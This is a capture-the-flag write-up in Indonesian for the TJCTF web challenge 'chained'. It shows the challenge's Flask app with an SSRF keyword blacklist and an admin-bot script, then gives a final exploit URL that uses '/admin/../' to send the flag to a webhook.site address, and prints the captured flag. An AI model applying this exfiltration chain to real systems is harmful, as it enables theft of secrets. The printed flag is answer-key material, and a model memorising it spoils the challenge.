# chained

> i designed my own admin bot! and i included an admin page that should be super duper secure... <br><br>running on port 5000<br><br>chained.tjc.tf<br><br>admin bot

Diberikan file app.py, index.html, dan admin-bot.js

Berikut isi file app.py:

```python
from flask import Flask, request, render_template, redirect, url_for
import requests

app = Flask(__name__)
'''
https://chained.tjc.tf/admin/../?url=https://webhook.site/71ef1340-99d5-478e-9afd-1db9c3c59039/?flag=
'''
def isSafe(url):
    blacklist={'127', 'local', '2130706433', '017700000001', '::1', '0.0.0.0', '[::]', 'ffff', '0.0.0.0', '0x', '..', '%2e%2e', '@'}
    return all([i not in url.lower() for i in blacklist])

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url'] or ''
        if not isSafe(url): return 'Access denied. URL parameter included one or more of the blacklisted keywords.'
        return redirect(url_for('index', url=url))
    url = request.args.get('url') or ''
    if url: 
        desc = 'The admin will visit your URL.'
        try: req = 'Your response: ' + requests.get(url).text
        except: return 'Uh-oh... Try again!'
    else: req, desc = '', ''
    return render_template('index.html', q = req, desc=desc)

@app.route('/admin')
def js():
    if request.remote_addr != '127.0.0.1': return 'Access denied. Page only accessible from server side.'
    query = request.args.get("q", "")
    return query, 200, {'Content-Type': 'application/javascript'}

if __name__ == '__main__':
    app.run()

```

Berikut isi dari index.html:

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="Content-Security-Policy" content= "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'none'; object-src 'none';  manifest-src 'none'; ">
        <link rel="stylesheet" href="static/style.css">
        <title>Chained</title>
    </head>
    
    <body>
        <h1>Chained Admin Bot</h1>
        <p>I designed an admin bot project that'll send a request to your website! I included a blacklist for URLs, so hopefully my sanitization is completely airtight...</p>
        <p>{{ desc }}</p>
        <form action="/" method="POST">
            <input type="url" name="url" placeholder="Input a URL here">
            <button type="submit">Submit</button>
        </form>
        <h3> {{ q | safe }} </h3>
    </body>
</html>
```

Berikut isi file admin-bot.js:

```js
$ cat admin-bot.js 
import flag from './flag.txt';

function sleep(time) {
    return new Promise(resolve => {
        setTimeout(resolve, time)
    });
}

export default {
    id: 'chained',
    name: 'chained',
    urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
    timeout: 10000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);
    }
};
```
 
Untuk mendapatkan flag, kita harus mengirimkan URL https://chained.tjc.tf/admin ke admin bot, namun kita harus mengirimkan flag tersebut agar kita bisa baca, sehingga kita perlu memanfaatkan parameter ?url pada app.py agar kita bisa memasukkan webhook untuk mengirimkan flagnya ke kita, namun parameter ?url berada pada https://chained.tjc.tf/, sedangkan untuk mendapatkan flag kita perlu mengirimkan URL https://chained.tjc.tf/admin, sehingga kita perlu mengakses indexnya dengan menambahkan ../ dan menggunakan fitur ?url setelahnya. Final URL-nya menjadi https://chained.tjc.tf/admin/../?url=https://webhook.site/71ef1340-99d5-478e-9afd-1db9c3c59039/?flag=

Ketika kita cek outputnya di webhook.site, didapatkan flagnya tjctf{ch41n3d_o340e934l35d}